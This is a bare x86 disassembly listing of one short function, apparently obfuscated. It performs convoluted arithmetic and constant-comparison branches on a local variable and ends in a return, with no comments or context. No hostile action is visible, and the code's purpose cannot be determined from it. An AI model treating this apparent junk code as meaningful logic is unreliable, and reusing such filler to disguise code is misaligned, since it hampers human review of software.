  45423a:	cmp    ebx,DWORD PTR [ebp-0x14]
  45423d:	jne    0x454253
  45423f:	mov    edx,DWORD PTR ds:0x471910
  454245:	mov    ebx,0xae
  45424a:	sub    DWORD PTR [ebp-0x4],ebx
  45424d:	or     DWORD PTR [ebp-0x4],edx
  454250:	sub    DWORD PTR [ebp-0x4],ecx
  454253:	pop    edi
  454254:	or     DWORD PTR [ebp-0x4],edi
  454257:	pop    esi
  454258:	mov    eax,DWORD PTR [ebp-0x4]
  45425b:	mov    ebx,DWORD PTR [ebp-0x4]
  45425e:	add    DWORD PTR [ebp-0x4],edx
  454261:	cmp    ebx,0x5e
  454264:	jne    0x4542b4
  454266:	mov    edx,DWORD PTR [ebp-0x4]
  454269:	add    eax,esi
  45426b:	add    edx,edx
  45426d:	xor    ecx,ecx
  45426f:	sub    edx,esi
  454271:	and    eax,ecx
  454273:	and    eax,esi
  454275:	cmp    esi,edx
  454277:	je     0x4542b4
  454279:	mov    ecx,0x47
  45427e:	and    edx,edi
  454280:	sub    DWORD PTR [ebp-0x4],edx
  454283:	and    ebx,edx
  454285:	cmp    ebx,0xffffffcc
  454288:	je     0x4542b4
  45428a:	mov    edx,0x4020060
  45428f:	sub    DWORD PTR [ebp-0x4],eax
  454292:	add    ebx,esi
  454294:	xor    eax,eax
  454296:	test   ebx,0xe2
  45429c:	jne    0x4542b4
  45429e:	cmp    esi,DWORD PTR [ebp-0x24]
  4542a1:	jne    0x4542b4
  4542a3:	add    eax,ebx
  4542a5:	sub    ecx,ebx
  4542a7:	xor    ebx,ebx
  4542a9:	add    ebx,ecx
  4542ab:	mov    DWORD PTR [ebp-0x4],eax
  4542ae:	sub    DWORD PTR [ebp-0x4],ebx
  4542b1:	sub    DWORD PTR [ebp-0x4],edx
  4542b4:	pop    ebx
  4542b5:	xor    eax,eax
  4542b7:	mov    ecx,DWORD PTR [ebp-0x4]
  4542ba:	sub    ecx,eax
  4542bc:	cmp    ecx,DWORD PTR ds:0x4718bc
  4542c2:	jne    0x4542ec
  4542c4:	mov    edx,DWORD PTR ds:0x4718b4
  4542ca:	mov    eax,DWORD PTR [ebp-0x4]
  4542cd:	cmp    ebx,0xffffffbe
  4542d0:	jne    0x4542ec
  4542d2:	add    eax,eax
  4542d4:	or     ecx,edx
  4542d6:	mov    edx,eax
  4542d8:	sub    DWORD PTR [ebp-0x4],ebx
  4542db:	sub    ecx,ebx
  4542dd:	xor    eax,eax
  4542df:	and    DWORD PTR [ebp-0x4],eax
  4542e2:	add    DWORD PTR [ebp-0x4],edx
  4542e5:	add    ecx,ecx
  4542e7:	add    ecx,ecx
  4542e9:	add    DWORD PTR [ebp-0x4],ecx
  4542ec:	leave  
  4542ed:	ret    
